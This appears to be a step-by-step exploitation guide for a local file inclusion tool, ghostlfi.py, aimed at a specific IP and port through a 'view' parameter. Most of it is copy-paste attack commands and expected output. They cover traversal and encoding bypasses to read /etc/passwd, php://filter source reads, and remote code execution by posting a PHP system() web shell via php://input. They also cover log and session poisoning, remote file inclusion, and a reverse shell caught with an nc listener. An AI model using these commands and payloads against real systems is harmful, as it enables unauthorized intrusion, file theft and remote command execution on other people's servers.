# ✅ EXPLOITATION GUIDE 

## Paramater Fuzzing

```
python3 ghostlfi.py -u http://94.237.57.211:45888/index.php --fuzz-params
```

## 🎯 Discovery Complete!

```
[+] Found 1 vulnerable parameter(s):
  - view
```

---

## 🚀 NEXT STEPS - Complete Exploitation

### Step 1: Verify LFI with File Fuzzing
```bash
python3 ghostlfi.py \
  -u http://94.237.57.211:45888/index.php \
  -p view \
  --fuzz-files

# This will:
# - Test 75+ sensitive files
# - Try 9 bypass techniques per file
# - Show readable files
# - Categorize findings (Configs/Logs/Sensitive)
```

**Expected Output:**
```
[FUZZING] Advanced File Discovery
[*] Testing 75 files...
[✓] Readable: /etc/passwd (via ../../../../etc/passwd)
[✓] Readable: /etc/hosts
[✓] Readable: /var/log/apache2/access.log

[LOGS] 1 log files (poisoning possible):
  - /var/log/apache2/access.log
```

---

### Step 2: Complete Reconnaissance
```bash
python3 ghostlfi.py \
  -u http://94.237.57.211:45888/index.php \
  -p view \
  --fuzz-all

# This will:
# - Fuzz files (75+ payloads)
# - Find logs (for poisoning)
# - Discover webroot
# - Show exploitation paths
```

---

### Step 3: Test LFI Bypasses
```bash
python3 ghostlfi.py \
  -u http://94.237.57.211:45888/index.php \
  -p view \
  --test-bypass

# Tests:
# - Path traversal (../, ../../, etc.)
# - Null byte injection (%00)
# - URL encoding
# - Double encoding
# - PHP wrappers (php://filter, expect://, data://)
# - 40+ bypass techniques
```

---

### Step 4: Automatic Exploitation (Recommended!)
```bash
python3 ghostlfi.py \
  -u http://94.237.57.211:45888/index.php \
  -p view \
  --auto

# Automatically:
# 1. Tests all LFI bypasses
# 2. Tests PHP wrappers
# 3. Tests for RCE
# 4. Finds working exploit
# 5. Shows you the payload
```

---

### Step 5: Get Interactive Shell
```bash
python3 ghostlfi.py \
  -u http://94.237.57.211:45888/index.php \
  -p view \
  --auto \
  --shell

# If RCE found:
# - Interactive web shell
# - Run commands directly
# - File operations
# - System enumeration

# Example:
ghostops@target:~$ whoami
www-data
ghostops@target:~$ pwd
/var/www/html
ghostops@target:~$ ls -la
total 48
drwxr-xr-x 3 www-data www-data 4096 Oct 16 15:10 .
```

---

### Step 6: Get Reverse Shell
```bash
python3 ghostlfi.py \
  -u http://94.237.57.211:45888/index.php \
  -p view \
  --auto \
  --revshell \
  --lhost YOUR_IP \
  --lport 4444

# On another terminal first:
nc -lvnp 4444

# Tool will:
# 1. Test 9 reverse shell types
# 2. Find working one
# 3. Deploy it
# 4. You get shell in nc listener!
```

---

### Step 7: Log Poisoning (if logs found)
```bash
python3 ghostlfi.py \
  -u http://94.237.57.211:45888/index.php \
  -p view \
  --test-log-poison

# Tests:
# - Apache access.log poisoning
# - Nginx access.log poisoning
# - User-Agent injection
# - Automatic RCE via logs
```

---

### Step 8: Session Poisoning
```bash
python3 ghostlfi.py \
  -u http://94.237.57.211:45888/index.php \
  -p view \
  --test-session-poison

# Tests:
# - PHP session file poisoning
# - Session hijacking
# - RCE via session files
```

---

### Step 9: Test RFI (Remote File Inclusion)
```bash
python3 ghostlfi.py \
  -u http://94.237.57.211:45888/index.php \
  -p view \
  --test-rfi

# Tests:
# - Remote URL inclusion
# - External file loading
# - RCE via RFI
```

---

## 💪 RECOMMENDED WORKFLOW

### Quick Path to Shell:
```bash
# Step 1: Quick exploitation attempt
python3 ghostlfi.py -u http://94.237.57.211:45888/index.php -p view --auto --shell

# If that works → You have interactive shell! ✅

# If not, go deeper:

# Step 2: Find readable files
python3 ghostlfi.py -u http://94.237.57.211:45888/index.php -p view --fuzz-files

# Step 3: If logs found, try poisoning
python3 ghostlfi.py -u http://94.237.57.211:45888/index.php -p view --test-log-poison

# Step 4: Try all advanced techniques
python3 ghostlfi.py -u http://94.237.57.211:45888/index.php -p view --auto --advanced --shell
```

---

## 🎯 MANUAL TESTING

### Read /etc/passwd:
```bash
# Try these URLs manually:
http://94.237.57.211:45888/index.php?view=/etc/passwd
http://94.237.57.211:45888/index.php?view=../../../../etc/passwd
http://94.237.57.211:45888/index.php?view=....//....//....//....//etc/passwd
http://94.237.57.211:45888/index.php?view=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
```

### PHP Filter (to read source):
```bash
http://94.237.57.211:45888/index.php?view=php://filter/convert.base64-encode/resource=index.php
```

### PHP Input (for RCE):
```bash
# POST request with:
POST /index.php?view=php://input HTTP/1.1
Host: 94.237.57.211:45888

<?php system($_GET['cmd']); ?>

# Then:
http://94.237.57.211:45888/index.php?view=php://input&cmd=id
```

---

## 📋 COMMAND SUMMARY

```bash
# Discovery (DONE ✅)
python3 ghostlfi.py -u URL --fuzz-params

# File Fuzzing (NEXT)
python3 ghostlfi.py -u URL -p view --fuzz-files

# Complete Recon
python3 ghostlfi.py -u URL -p view --fuzz-all

# Auto Exploitation
python3 ghostlfi.py -u URL -p view --auto

# Interactive Shell
python3 ghostlfi.py -u URL -p view --auto --shell

# Reverse Shell
python3 ghostlfi.py -u URL -p view --auto --revshell --lhost YOUR_IP

# Log Poisoning
python3 ghostlfi.py -u URL -p view --test-log-poison

# Session Poisoning
python3 ghostlfi.py -u URL -p view --test-session-poison

# RFI Testing
python3 ghostlfi.py -u URL -p view --test-rfi

# Generate Payloads
python3 ghostlfi.py -u URL -p view --generate lfi
```

---

## 🎮 COPY-PASTE COMMANDS FOR YOUR TARGET

```bash
# File discovery
python3 ghostlfi.py -u http://94.237.57.211:45888/index.php -p view --fuzz-files

# Complete recon
python3 ghostlfi.py -u http://94.237.57.211:45888/index.php -p view --fuzz-all

# Quick shell attempt
python3 ghostlfi.py -u http://94.237.57.211:45888/index.php -p view --auto --shell

# Reverse shell (replace YOUR_IP)
python3 ghostlfi.py -u http://94.237.57.211:45888/index.php -p view --auto --revshell --lhost YOUR_IP --lport 4444

# Log poisoning
python3 ghostlfi.py -u http://94.237.57.211:45888/index.php -p view --test-log-poison
```

---

**Ghost Ops Security** | Exploitation Guide 👻

**Next Step:** Run file fuzzing or auto-exploitation!

**Recommended:** `python3 ghostlfi.py -u http://94.237.57.211:45888/index.php -p view --auto --shell`

**From discovery to shell in seconds!** 💪🎯🔥
